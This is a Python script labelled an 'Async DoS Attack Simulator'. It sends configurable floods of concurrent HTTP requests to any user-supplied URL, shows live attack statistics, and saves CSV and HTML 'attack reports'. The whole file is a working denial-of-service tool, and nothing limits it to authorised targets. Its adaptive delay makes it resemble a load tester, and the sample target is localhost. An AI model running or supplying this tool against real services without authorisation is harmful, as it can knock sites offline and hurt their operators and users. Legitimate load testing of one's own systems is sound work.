import asyncio
import aiohttp
import datetime
import os
import sys
import time
from colorama import Fore, init
import csv
import html
from rich.live import Live
from rich.table import Table
from rich.console import Console
import json

desktop_path = os.path.expanduser("~/Desktop")

init(autoreset=True)

console = Console()

# Global statistics dictionary and async lock
stats = {
    'total_requests': 0,
    'successful_requests': 0,
    'failed_requests': 0,
    'total_response_time': 0.0,
    'fastest_response_time': None,
    'slowest_response_time': None,
}
stats_lock = asyncio.Lock()

# Global variables for logging
log_file_path = None
save_logs = False

async def render_stats():
    table = Table(title="Attack Statistics Summary")
    table.add_column("Metric", style="cyan", no_wrap=True)
    table.add_column("Value", style="magenta")

    async with stats_lock:
        total = stats['total_requests']
        success = stats['successful_requests']
        failed = stats['failed_requests']
        avg_resp = (stats['total_response_time'] / success) if success > 0 else 0
        fastest = stats['fastest_response_time']
        slowest = stats['slowest_response_time']

    table.add_row("Total requests", str(total))
    table.add_row("Successful requests", str(success))
    table.add_row("Failed requests", str(failed))
    table.add_row("Average response time (s)", f"{avg_resp:.3f}" if success > 0 else "N/A")
    table.add_row("Fastest response time (s)", f"{fastest:.3f}" if fastest is not None else "N/A")
    table.add_row("Slowest response time (s)", f"{slowest:.3f}" if slowest is not None else "N/A")

    return table

async def live_stats_updater(stop_event):
    with Live(await render_stats(), refresh_per_second=4, console=console) as live:
        while not stop_event.is_set():
            live.update(await render_stats())
            await asyncio.sleep(0.25)

async def check_target_health(url):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.head(url, timeout=5) as resp:
                if resp.status < 400:
                    print(f"{Fore.GREEN}✅ Target is reachable with status code {resp.status}.")
                    return True
                else:
                    print(f"{Fore.YELLOW}⚠️ Target returned error status code {resp.status}.")
                    return False
    except Exception as e:
        print(f"{Fore.RED}❌ Could not reach target: {e}")
        return False

async def attack(session, url, delay, method, headers=None, body=None):
    global stats
    try:
        start = time.perf_counter()
        async with session.request(method, url, headers=headers, data=body if body else None) as response:
            status = response.status
            await response.text()
        duration = time.perf_counter() - start
        print(f"{Fore.GREEN}✅ Status: {status} | Response time: {duration:.2f}s")

        async with stats_lock:
            stats['total_requests'] += 1
            if status < 400:
                stats['successful_requests'] += 1
            else:
                stats['failed_requests'] += 1
            stats['total_response_time'] += duration
            if stats['fastest_response_time'] is None or duration < stats['fastest_response_time']:
                stats['fastest_response_time'] = duration
            if stats['slowest_response_time'] is None or duration > stats['slowest_response_time']:
                stats['slowest_response_time'] = duration

        # Log to file (async not available, use blocking but fast)
        if save_logs and log_file_path:
            try:
                timestamp = datetime.datetime.now().isoformat()
                with open(log_file_path, "a", encoding="utf-8", newline='') as log_file:
                    log_file.write(f"{timestamp}, Status: {status}, Response Time: {duration:.3f}s\n")
            except Exception as e:
                print(f"{Fore.RED}❌ Logging failed: {e}")

        # Adjust delay dynamically - optional in async
        if duration > 1:
            delay[0] = min(delay[0] + 0.5, 5.0)
            print(f"{Fore.YELLOW}⏳ Response time > 1s, increasing delay to {delay[0]:.2f}s")
        elif duration < 0.5:
            delay[0] = max(delay[0] - 0.1, 0.1)
            print(f"{Fore.YELLOW}⏳ Response time < 0.5s, decreasing delay to {delay[0]:.2f}s")

    except Exception as e:
        print(f"{Fore.RED}❌ Error: {e}")
        async with stats_lock:
            stats['total_requests'] += 1
            stats['failed_requests'] += 1
        if save_logs and log_file_path:
            try:
                timestamp = datetime.datetime.now().isoformat()
                with open(log_file_path, "a", encoding="utf-8", newline='') as log_file:
                    log_file.write(f"{timestamp}, Error, {e}\n")
            except Exception as e:
                print(f"{Fore.RED}❌ Logging failed: {e}")

    await asyncio.sleep(delay[0])

async def main_async():
    global save_logs, log_file_path

    print(f"{Fore.CYAN}💥 Async DoS Attack Simulator 💥\n")

    target_url = input("🎯 Enter target URL (e.g. http://127.0.0.1:5000): ").strip()

    if not await check_target_health(target_url):
        answer = input(f"{Fore.YELLOW}⚠️ Target is unreachable or returned error. Do you want to continue? (y/n): ").strip().lower()
        if answer != 'y':
            print(f"{Fore.RED}Exiting program.")
            sys.exit()

    method_input = input("📝 Enter HTTP method (GET, POST, PUT, DELETE) [GET]: ").strip().upper()
    if method_input not in ['GET', 'POST', 'PUT', 'DELETE']:
        method_input = 'GET'

    headers_input = input("🛠️ Enter custom headers as JSON string (or leave empty): ").strip()
    try:
        headers = json.loads(headers_input) if headers_input else {}
        if not isinstance(headers, dict):
            print(f"{Fore.YELLOW}⚠️ Headers input is not a JSON object, defaulting to empty headers.")
            headers = {}
    except Exception:
        print(f"{Fore.YELLOW}⚠️ Invalid JSON for headers, defaulting to empty headers.")
        headers = {}

    body = None
    if method_input in ['POST', 'PUT']:
        body_input = input("📝 Enter request body (or leave empty): ")
        body = body_input if body_input else None

    number_of_requests = int(input("📨 Enter number of requests: "))
    concurrency = int(input("🔁 Enter concurrency level (number of simultaneous requests): "))
    initial_delay = float(input("⏳ Delay between requests (seconds): "))
    delay = [initial_delay]  # mutable delay

    save_logs_input = input("💾 Save logs and reports? (y/n): ").strip().lower()
    save_logs = (save_logs_input == 'y')

    timestamp_str = None
    if save_logs:
        timestamp_str = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        log_file_path = os.path.join(desktop_path, f"attack_log_{timestamp_str}.txt")
    else:
        log_file_path = None

    connector = aiohttp.TCPConnector(limit=concurrency)
    stop_event = asyncio.Event()
    live_task = asyncio.create_task(live_stats_updater(stop_event))
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        for _ in range(number_of_requests):
            tasks.append(asyncio.create_task(attack(session, target_url, delay, method_input, headers=headers, body=body)))
        await asyncio.gather(*tasks)
    stop_event.set()
    await live_task

    print(f"\n{Fore.GREEN}✅ Attack finished.")

    if save_logs and timestamp_str:
        # --- CSV REPORT ---
        csv_file = os.path.join(desktop_path, f"attack_report_{timestamp_str}.csv")
        try:
            with open(csv_file, "w", newline="", encoding="utf-8") as csvfile:
                writer = csv.writer(csvfile)
                writer.writerow(["Metric", "Value"])
                writer.writerow(["Total requests", stats['total_requests']])
                writer.writerow(["Successful requests", stats['successful_requests']])
                writer.writerow(["Failed requests", stats['failed_requests']])
                avg_resp = (stats['total_response_time'] / stats['successful_requests']) if stats['successful_requests'] > 0 else 0
                writer.writerow(["Average response time (s)", f"{avg_resp:.3f}" if stats['successful_requests'] > 0 else "N/A"])
                writer.writerow(["Fastest response time (s)", f"{stats['fastest_response_time']:.3f}" if stats['fastest_response_time'] is not None else "N/A"])
                writer.writerow(["Slowest response time (s)", f"{stats['slowest_response_time']:.3f}" if stats['slowest_response_time'] is not None else "N/A"])
            print(f"{Fore.GREEN}📄 CSV report written to: {csv_file}")
        except Exception as e:
            print(f"{Fore.RED}❌ Failed to write CSV report: {e}")

        # --- HTML REPORT ---
        html_file = os.path.join(desktop_path, f"attack_report_{timestamp_str}.html")
        try:
            log_lines = []
            if log_file_path and os.path.exists(log_file_path):
                with open(log_file_path, "r", encoding="utf-8") as f:
                    log_lines = f.readlines()
            # Escape for HTML
            log_html = "".join(
                "<tr><td>{}</td></tr>\n".format(html.escape(line.strip()))
                for line in log_lines
            )
            avg_resp = (stats['total_response_time'] / stats['successful_requests']) if stats['successful_requests'] > 0 else 0
            html_content = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Attack Report</title>
    <style>
        body {{ font-family: Arial, sans-serif; background: #f6f8fa; color: #222; margin: 40px; }}
        h1 {{ color: #1976d2; }}
        table {{ border-collapse: collapse; width: 60%; margin-bottom: 32px; }}
        th, td {{ border: 1px solid #bbb; padding: 8px 12px; }}
        th {{ background: #e3eafc; }}
        tr:nth-child(even) td {{ background: #f3f6fb; }}
        .log-table {{ width: 80%; }}
        .log-table td {{ font-family: monospace; font-size: 0.95em; }}
    </style>
</head>
<body>
    <h1>Attack Report</h1>
    <table>
        <tr><th>Metric</th><th>Value</th></tr>
        <tr><td>Total requests</td><td>{total}</td></tr>
        <tr><td>Successful requests</td><td>{success}</td></tr>
        <tr><td>Failed requests</td><td>{failed}</td></tr>
        <tr><td>Average response time (s)</td><td>{avg_resp}</td></tr>
        <tr><td>Fastest response time (s)</td><td>{fastest}</td></tr>
        <tr><td>Slowest response time (s)</td><td>{slowest}</td></tr>
    </table>
    <h2>Attack Log</h2>
    <table class="log-table">
        {log_html}
    </table>
</body>
</html>
""".format(
                total=stats['total_requests'],
                success=stats['successful_requests'],
                failed=stats['failed_requests'],
                avg_resp=f"{avg_resp:.3f}" if stats['successful_requests'] > 0 else "N/A",
                fastest=f"{stats['fastest_response_time']:.3f}" if stats['fastest_response_time'] is not None else "N/A",
                slowest=f"{stats['slowest_response_time']:.3f}" if stats['slowest_response_time'] is not None else "N/A",
                log_html=log_html
            )
            with open(html_file, "w", encoding="utf-8") as f:
                f.write(html_content)
            print(f"{Fore.GREEN}📄 HTML report written to: {html_file}")
        except Exception as e:
            print(f"{Fore.RED}❌ Failed to write HTML report: {e}")

if __name__ == "__main__":
    asyncio.run(main_async())